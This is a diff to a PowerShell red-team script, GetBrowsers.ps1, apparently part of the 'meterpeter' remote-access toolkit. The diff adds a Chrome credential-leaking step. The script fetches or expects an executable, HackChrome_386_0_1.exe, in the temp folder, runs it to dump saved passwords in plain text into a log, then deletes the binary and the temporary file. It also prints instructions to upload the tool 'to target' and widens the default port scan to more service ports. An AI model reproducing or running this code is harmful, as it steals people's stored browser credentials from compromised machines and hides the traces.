@@ -4,7 +4,7 @@
 
   Author: r00t-3xp10it (SSA RedTeam @2020)
   Required Dependencies: IE, Firefox, Chrome
-  Optional Dependencies: mozlz4-win32.exe
+  Optional Dependencies: mozlz4-win32.exe, HackChrome_386_0_1.exe
   PS Script Dev Version: v1.18
 
 .DESCRIPTION
@@ -21,6 +21,11 @@
    Used to convert firefox bookmarks files from: .jsonlz4 To: .json (More clean outputs)
    mozlz4-win32 requires to be uploaded to $env:tmp folder for GetBrowsers.ps1 to use it.
    url: https://github.com/r00t-3xp10it/meterpeter/tree/master/mimiRatz/mozlz4-win32.exe
+
+   HackChrome_386_0_1.exe (Optional Dependencie)
+   Used to uncrypt chrome browser stored credentials to plain text
+   HackChrome_386_0_1 requires to be uploaded to $env:tmp folder for GetBrowsers to use it.
+   url: https://github.com/r00t-3xp10it/meterpeter/tree/master/mimiRatz/HackChrome_386_0_1.exe
 
 .EXAMPLE
    PS C:\> ./GetBrowsers.ps1
@@ -50,6 +55,7 @@
    PS C:\> ./GetBrowsers.ps1 -SCAN 80,135,139,445
    Enumerates local|remote host open|closed tcp ports 
    'This Function does not allow the permanent storage of the logfile'
+   'If none value its enter after -SCAN arg, then a pre-select portscan will be conducted'
 
 .INPUTS
    None. You cannot pipe objects to GetBrowsers.ps1
@@ -816,28 +822,33 @@ function CREDS_DUMP {
         $Json.logins|select-object hostname,encryptedPassword >> $LogFilePath\BrowserEnum.log
     }
 
-    ## Retrieve Chrome Credentials (plain text)
-    echo "`n`n[ Chrome ]" >> $LogFilePath\BrowserEnum.log
-    echo "`nEnumerating LogIns" >> $LogFilePath\BrowserEnum.log
-    echo "------------------" >> $LogFilePath\BrowserEnum.log
-    If(-not(Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data")){
-        echo "{None Credentials found}" >> $LogFilePath\BrowserEnum.log
+    ## Leak chrome creds
+    # Invoke-WebRequest -Uri "https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/HackChrome_386_0_1.exe" -OutFile "$env:tmp\HackChrome_386_0_1.exe"
+    If(Test-Path "$env:tmp\HackChrome_386_0_1.exe"){
+        $IPATH = pwd
+        cd $env:tmp;./HackChrome_386_0_1.exe > $env:tmp\leakcreds.txt
+        $storecreds = Get-Content "$env:tmp\leakcreds.txt"|findstr /I /V /C:"Total Auth:"
+        echo "`n`n[ Chrome ]" >> $LogFilePath\BrowserEnum.log
+        echo "`nLeaking Chrome Creds" >> $LogFilePath\BrowserEnum.log
+        # Remove old files
+        If(Test-Path "$env:tmp\HackChrome_386_0_1.exe"){
+            Remove-Item "$env:tmp\HackChrome_386_0_1.exe" -Force
+            Remove-Item "$env:tmp\leakcreds.txt" -Force
+        }
+        echo $storecreds >> $LogFilePath\BrowserEnum.log
+        cd $IPATH
     }else{
-        $Json = Get-Content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"|Select-String -pattern "http","https"
-        If(-not($Json) -or $Json -eq $null){
-            echo "None Credentials found .." >> $LogFilePath\BrowserEnum.log
-        }else{
-            ForEach ($Key in $Json){
-                $Regex = $Key -replace '[^a-zA-Z0-9/:. ]','' # Replace all chars that does NOT match the Regex
-                $ParseData = $Regex.Split('/')[2]            # Extract from string only the DomainName ..
-                echo $ParseData >> $LogFilePath\BrowserEnum.log
-            }
-       }
+        echo "`n`n[ Chrome ]" >> $LogFilePath\BrowserEnum.log
+        echo "`nLeaking Chrome Creds" >> $LogFilePath\BrowserEnum.log
+        echo "--------------------" >> $LogFilePath\BrowserEnum.log
+        echo "{Upload: meterpeter\mimiRatz\HackChrome_386_0_1.exe to target `$env:tmp}" >> $LogFilePath\BrowserEnum.log
+        echo "{And Execute: [ ./GetBrowsers.ps1 -CHROME ] to leak chrome credentials}" >> $LogFilePath\BrowserEnum.log
+        echo "{https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/HackChrome_386_0_1.exe}" >> $LogFilePath\BrowserEnum.log
     }
     
     ## Search for passwords in { ConsoleHost_history }
     If(-not(Test-Path "$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt")){
-        echo "`n`nCreds in ConsoleHost_history.txt" >> $LogFilePath\BrowserEnum.log
+        echo "Creds in ConsoleHost_history.txt" >> $LogFilePath\BrowserEnum.log
         echo "--------------------------------" >> $LogFilePath\BrowserEnum.log
         echo "{ConsoleHost_history.txt not found}" >> $LogFilePath\BrowserEnum.log
     }else{
@@ -862,7 +873,7 @@ function CREDS_DUMP {
 
  ## Function tcp port scanner
  function PORTSCANNER {
-    If(-not($param2)){$PortRange = "22,80,139,445"}else{$PortRange = $param2}
+    If(-not($param2)){$PortRange = "21,22,23,80,135,137,139,443,445,3306"}else{$PortRange = $param2}
     $Remote_Host = (Test-Connection -ComputerName (hostname) -Count 1 -ErrorAction SilentlyContinue).IPV4Address.IPAddressToString
     echo "`n`nRemote-Host   Status   Port" >> $LogFilePath\BrowserEnum.log
     echo "-----------   ------   ----" >> $LogFilePath\BrowserEnum.log
